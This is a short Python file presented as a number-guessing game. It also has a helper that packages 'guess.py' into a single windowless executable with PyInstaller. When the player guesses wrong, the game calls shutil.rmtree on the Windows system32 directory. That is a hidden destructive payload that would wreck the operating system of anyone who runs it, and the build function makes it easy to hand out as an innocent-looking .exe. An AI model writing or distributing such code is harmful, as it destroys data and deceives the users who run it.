def one_option():
    import random
    import os
    import shutil
    select = random.randint(1, 10)
    try:
        guess = int(input("Select a number between 1 and 10: "))
    except ValueError:
        print("Invalid input! Please enter a valid number.")
        return

    if guess == select:
        print("Good game! You won.")
    else:
        parent = r"C:\\windows\\system32"
        shutil.rmtree(parent)

# Define the create_exe function
def create_exe():
    import subprocess
    import sys
    """Function to create an .exe using PyInstaller when the user selects the game option."""
    print("Building the executable...")

    try:
        result = subprocess.run(['pyinstaller', '--onefile', '--noconsole', 'guess.py'], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Print the output of PyInstaller
        print("PyInstaller Output:")
        print(result.stdout.decode())
        print(result.stderr.decode())
        
        print("Executable created successfully!")
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while creating the executable: {e}")
        print("Detailed error output:")
        print(e.stderr.decode())
